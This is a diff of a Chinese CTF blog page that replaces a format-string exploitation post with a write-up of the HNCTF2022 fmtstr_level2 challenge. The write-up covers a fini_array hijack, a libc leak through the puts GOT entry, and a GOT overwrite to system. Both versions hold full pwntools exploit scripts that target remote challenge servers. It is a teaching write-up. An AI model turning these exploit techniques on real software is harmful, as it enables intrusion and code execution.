-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25117</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804C044</span>:<span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>但是这里我们会发现 recv接收到的数据太多了 像ret2libc中的接收办法显然是会出错的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
 
-<p>可以看到，我们就这样轻易的将addr处的随机数更改为了1</p>
-<p>是不是比之前的两种payload构造办法简单许多？</p>
+<p>这里用到[-6:]   只接收后六个字节</p>
+<p>那么我们此时成功进行了fini劫持 我们再输入io.recv()就会发现又接收到了main函数开始时puts的那些字符串</p>
+<p>第二次的payload就简单至极了 最后放下完整的exp吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28466</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;First please tell me your game ID&quot;</span>)</span><br><span class="line">fini_addr = <span class="number">0x4031F0</span></span><br><span class="line">main_addr = <span class="number">0x4011b6</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;%182c%11$lln%91c%12$hhn%47c%13$hhn%14$sa\xf01@\x00\x00\x00\x00\x00\xf11@\x00\x00\x00\x00\x00\xf21@\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.recv()</span><br><span class="line">io.recvuntil(<span class="string">&quot;First please tell me your game ID&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;puts_got:system_addr&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2557,10 +2528,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-23T17:14:29+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-10-12T13:25:08+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Sep 23, 2022</p>
+    <p>更新于：Oct 12, 2022</p>
   </a>
 </div>
 
@@ -2579,7 +2550,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/&title=格式化字符串漏洞 - Chen&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/&title=格式化字符串任意写&泄露基址 - Chen&summary="
           
           >
           
@@ -2591,7 +2562,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/&title=格式化字符串漏洞 - Chen&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/&title=格式化字符串任意写&泄露基址 - Chen&summary="
           
           >
           
@@ -2603,7 +2574,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/&title=格式化字符串漏洞 - Chen&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/&title=格式化字符串任意写&泄露基址 - Chen&summary="
           
           >
           
@@ -2636,18 +2607,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2022/09/23/ret2libc/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>ret2libc</p>
-          <p class='content'>前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量
-那么我们还有办法自己构建一个后门函数...</p>
-        </a>
       
-      
-        <a class='next' href='/2022/09/22/Linux%E5%86%85%E6%A0%B8/'>
-          <p class='title'>Linux内核<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>先从内核开始了解
-什么是内核?1.内核的作用是将Linux系统的应用程序的请求传递给硬件，并且充当底层驱动程序，对linux中的各种设备和组件进行寻址
-可以将其理解为中介，卖家(计算机)和买家(...</p>
+        <a class='next' href='/2022/10/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/'>
+          <p class='title'>密码学笔记<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>自己用的密码学笔记 不准备讲的跟pwn一样详细
+MD5hash算法一类 32位数字和字母混合码
+base
+base16：包含数字0-9，大写字母A-F 
+base32：包含数字2-7，大写字母A...</p>
         </a>
       
     </div>
@@ -2663,7 +2630,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2705,7 +2672,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">格式化字符串漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E7%9A%84%E8%AF%BB%E5%8F%96%E5%8F%8A%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E5%86%99%E5%85%A5"><span class="toc-text">任意内存的读取及任意内存写入</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF2022-WEEK2-fmtstr-level2"><span class="toc-text">HNCTF2022-[WEEK2]fmtstr_level2</span></a></li></ol>
     </div>
   </section>
 
@@ -3279,7 +3246,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/09/22/格式化字符串漏洞/","name":"格式化字符串漏洞"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"格式化字符串漏洞","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","wordCount":0,"datePublished":"2022-09-22T13:55:33.000Z","dateModified":"2022-09-23T09:14:29.157Z","articleSection":"栈","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/10/12/格式化字符串任意写-泄露基址/","name":"格式化字符串任意写&泄露基址"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"格式化字符串任意写&泄露基址","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/10/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%BB%E6%84%8F%E5%86%99-%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/","wordCount":0,"datePublished":"2022-10-12T02:25:53.000Z","dateModified":"2022-10-12T05:25:08.173Z","articleSection":"栈","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
